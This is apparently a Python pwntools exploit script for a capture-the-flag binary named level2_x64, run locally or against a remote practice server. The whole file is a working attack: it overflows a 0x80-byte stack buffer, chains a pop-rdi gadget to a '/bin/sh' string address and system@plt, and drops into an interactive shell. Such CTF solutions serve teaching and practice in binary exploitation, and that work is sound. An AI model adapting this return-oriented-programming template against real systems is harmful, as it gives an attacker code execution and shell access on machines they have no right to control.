from pwn import *
file_path='./level2_x64'
context(binary=file_path,os='linux',terminal = ['tmux', 'sp', '-h'])
glibc_version="2.23"
_debug_=1

elf = ELF(file_path)
#pwn.io init
if _debug_:
    pwn_file="/glibc/%s/64/lib/ld-%s.so --library-path /glibc/%s/64/lib/ %s"%(glibc_version,glibc_version,glibc_version,file_path)
    p = process(pwn_file.split())
    libc = ELF('/glibc/%s/64/lib/libc-%s.so'%(glibc_version,glibc_version))
else:
    p = remote('node3.buuoj.cn',28124)
    libc = ELF('../libc/u16/x86libc-2.23.so')

system_plt = elf.plt['system']
pop_rdi_ret = 0x00000000004006b3
binsh = 0x600A90

payload = b'a'*0x80+b'b'*8
payload += p64(pop_rdi_ret)+p64(binsh)#设置rdi=binsh
payload += p64(system_plt)

p.sendafter('Input:',payload)
p.interactive()